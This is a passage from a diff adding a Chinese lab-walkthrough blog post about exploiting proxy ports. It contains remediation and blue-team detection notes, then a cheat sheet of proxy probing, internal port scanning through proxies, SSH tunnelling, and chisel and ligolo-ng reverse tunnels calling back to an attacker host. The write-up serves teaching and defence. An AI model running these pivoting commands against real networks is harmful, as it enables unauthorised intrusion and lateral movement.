+<li><strong>代理凭据明文泄露</strong>（<code>/admin/config</code> + 目录列表）。→ 配置文件移出 Web 根、不明文存凭据、关闭目录列表。</li>
+<li><strong>弱口令且复用</strong>（<code>root:123</code> 同时是 SSH 口令）。→ 强密码 + 凭据隔离。</li>
+<li><strong>代理允许 CONNECT 到任意本地端口</strong>，把只监听 <code>127.0.0.1</code> 的 SSH 变相暴露。→ 限制代理可转发的目标（白名单），禁止访问回环敏感端口。</li>
+<li><strong>管理 API &#x2F; metrics 暴露内网信息</strong>。→ API 绑定本地 + 强认证；metrics 限制访问。</li>
+</ol>
+<p><strong>检测要点（蓝队）</strong>：</p>
+<ul>
+<li>监控异常的 <code>CONNECT</code> 请求，尤其指向 <code>127.0.0.1:22/3389/3306</code> 等。</li>
+<li>代理日志里同一源 IP 短时间大量不同目标端口 &#x3D; 端口扫描特征。</li>
+<li>出现非业务的隧道进程（chisel&#x2F;frpc&#x2F;gost&#x2F;ngrok）即高危。</li>
+<li>出口侧检测长连接、非常规端口的加密隧道。</li>
+<li>主机侧：监控 <code>ProxyCommand</code>、<code>ssh -D/-L/-R</code>、<code>autoroute</code> 等 pivot 行为。</li>
+</ul>
+<p><strong>加固清单</strong>：</p>
+<ul>
+<li>最小化暴露：代理服务绑定到必要接口，强认证 + 速率限制 + 目标白名单。</li>
+<li>网络分段：内网服务不应能被一个被攻陷的边界代理任意访问。</li>
+<li>凭据管理：禁止明文存储与复用，定期轮换。</li>
+<li>监控隧道工具特征与异常出站连接。</li>
+</ul>
+<hr>
+<h2 id="11-速查表"><a href="#11-速查表" class="headerlink" title="11. 速查表"></a>11. 速查表</h2><h3 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -sC -p &lt;port&gt; &lt;target&gt;<br>nmap --script socks-open-proxy -p 1080 &lt;target&gt;<br>nmap --script http-open-proxy -p 3128,8080 &lt;target&gt;<br>curl -v -x http://&lt;t&gt;:&lt;p&gt; http://example.com/        <span class="hljs-comment"># HTTP 代理</span><br>curl -v -x http://&lt;t&gt;:&lt;p&gt; https://example.com/        <span class="hljs-comment"># CONNECT</span><br>curl -v --socks5 &lt;t&gt;:&lt;p&gt; http://example.com/          <span class="hljs-comment"># SOCKS5</span><br>curl -v --socks5-hostname &lt;t&gt;:&lt;p&gt; http://example.com/ <span class="hljs-comment"># SOCKS5 + 远端 DNS</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="经代理探测内网"><a href="#经代理探测内网" class="headerlink" title="经代理探测内网"></a>经代理探测内网</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># HTTP CONNECT 代理逐端口（000/200=开, 503=关）</span><br>P=<span class="hljs-string">&quot;http://user:pass@&lt;t&gt;:&lt;port&gt;&quot;</span><br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> 22 80 443 3306 6379 8080; <span class="hljs-keyword">do</span><br>  curl -s -m4 -o /dev/null -w <span class="hljs-string">&quot;<span class="hljs-variable">$p</span> -&gt; %&#123;http_code&#125;\n&quot;</span> -x <span class="hljs-string">&quot;<span class="hljs-variable">$P</span>&quot;</span> http://127.0.0.1:<span class="hljs-variable">$p</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-comment"># proxychains + nmap（务必 -sT -Pn -n）</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;http &lt;t&gt; &lt;port&gt; user pass&quot;</span> &gt;&gt; /etc/proxychains4.conf<br>proxychains4 nmap -sT -Pn -n -p- 10.10.10.0/24<br><br><span class="hljs-comment"># SOCKS5 + ncat 探测</span><br>ncat --proxy &lt;t&gt;:1080 --proxy-type socks5 127.0.0.1 22 &lt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<h3 id="SSH-穿代理"><a href="#SSH-穿代理" class="headerlink" title="SSH 穿代理"></a>SSH 穿代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># HTTP CONNECT（Gost 法）</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=ncat --proxy &lt;t&gt;:&lt;port&gt; --proxy-type http --proxy-auth user:pass %h %p&quot;</span> u@host<br><span class="hljs-comment"># SOCKS5</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=ncat --proxy &lt;t&gt;:1080 --proxy-type socks5 %h %p&quot;</span> u@host<br><span class="hljs-comment"># OpenBSD nc</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=nc -X connect -x &lt;t&gt;:&lt;port&gt; %h %p&quot;</span> u@host   <span class="hljs-comment"># HTTP CONNECT</span><br>ssh -o <span class="hljs-string">&quot;ProxyCommand=nc -X 5 -x &lt;t&gt;:1080 %h %p&quot;</span> u@host           <span class="hljs-comment"># SOCKS5</span><br><span class="hljs-comment"># 跳板机</span><br>ssh -J user@bastion user@target<br><span class="hljs-comment"># 经 proxychains</span><br>proxychains4 ssh user@127.0.0.1<br></code></pre></td></tr></table></figure>
+
+<h3 id="拿到-SSH-后建隧道"><a href="#拿到-SSH-后建隧道" class="headerlink" title="拿到 SSH 后建隧道"></a>拿到 SSH 后建隧道</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -D 1080 -N -f user@target                 <span class="hljs-comment"># 动态 SOCKS</span><br>ssh -L 6379:10.10.10.9:6379 -N user@target     <span class="hljs-comment"># 本地转发</span><br>ssh -R 8000:127.0.0.1:8000 -N user@target      <span class="hljs-comment"># 远程转发</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="自带隧道工具"><a href="#自带隧道工具" class="headerlink" title="自带隧道工具"></a>自带隧道工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># chisel</span><br>./chisel server -p 8080 --reverse              <span class="hljs-comment"># 攻击机</span><br>./chisel client &lt;atk&gt;:8080 R:1080:socks        <span class="hljs-comment"># 目标</span><br><span class="hljs-comment"># ligolo-ng</span><br>./proxy -selfcert                               <span class="hljs-comment"># 攻击机</span><br>./agent -connect &lt;atk&gt;:11601 -ignore-cert       <span class="hljs-comment"># 目标</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>代理是渗透测试中”以小博大”的支点：一个看似普通的端口，可能就是通向整个内网的隧道入口。应对的核心方法论始终一致——</p>
+<ol>
+<li><strong>识别</strong>：它是什么协议、要不要认证、是哪个软件。</li>
+<li><strong>对话</strong>：用对协议（HTTP&#x2F;CONNECT&#x2F;SOCKS），拿到能用的通道。</li>
+<li><strong>探测</strong>：借它去看你直接看不到的网络，尤其 <code>127.0.0.1</code> 和内网段。</li>
+<li><strong>穿透</strong>：让 SSH、扫描器、利用工具都能经它工作；必要时自建隧道把内网整体拉出来。</li>
+<li><strong>升级</strong>：把单点代理变成稳定的 pivot，支撑后续横向。</li>
+</ol>
+<p>Gost 靶机用一条 <code>泄露代理凭据 → CONNECT 隧穿到本地 SSH → 进内网</code> 的链子，把这套方法论演绎得淋漓尽致。把本文的命令和思路内化，下次再见到任何代理端口，你都能迅速判断它的价值并把它”为我所用”。</p>
+<blockquote>
+<p>再次声明：本文所有技术仅用于<strong>授权范围内</strong>的渗透测试、红队演练与安全研究。未经授权对他人系统使用属违法行为。</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%AC%94%E8%AE%B0/" class="print-no-link">#笔记</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>打靶机时遇到的代理端口及应对方法</div>
+      <div>http://example.com/2026/06/11/打靶机时遇到的代理端口及应对方法/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>June 11, 2026</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/06/18/HackThebox-Flight/" title="HackThebox-Flight">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackThebox-Flight</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/06/10/The-Final-Cut/" title="The Final Cut">
+                        <span class="hidden-mobile">The Final Cut</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <style>.statistics { display: none !important; }</style>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<br>
+<script async src="//cdn.busuanzi.cc/busuanzi/3.6.9/busuanzi.min.js"></script>
+<span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_site_pv" style="color:red">...</span> 次 </span> &nbsp; | &nbsp; <span id="busuanzi_container_site_uv"> 总访客数 <span id="busuanzi_site_uv" style="color:red">...</span> 人 </span> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/random-slogan.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
